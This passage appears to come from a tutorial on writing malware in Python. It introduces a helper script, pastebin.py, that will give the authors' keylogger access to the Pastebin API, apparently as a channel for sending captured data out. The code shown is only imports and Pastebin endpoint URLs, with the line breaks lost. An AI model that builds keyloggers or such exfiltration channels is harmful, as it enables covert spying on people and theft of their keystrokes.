    that communicate with their servers with efficiency. Before we can update out
    keylogger code, we first need to write the support code to conveniently access
    and use Pastebin API. We will call the script pastebin.py.


    Pastebin.py will use the requests library to send responses in XML format, therefore,
    we will also need to import Python’s XML parser as in our code below. The three
    URLs of interest that we will use in the script are also defined in this section.


    | import requestsimport xml.etree.ElementTree as xmlparserlogin = "http://pastebin.com/api/api_login.php"post
    = "http://pastebin.com/api/api_post.php"raw = "http://pastebin.com/raw.php?i={}"
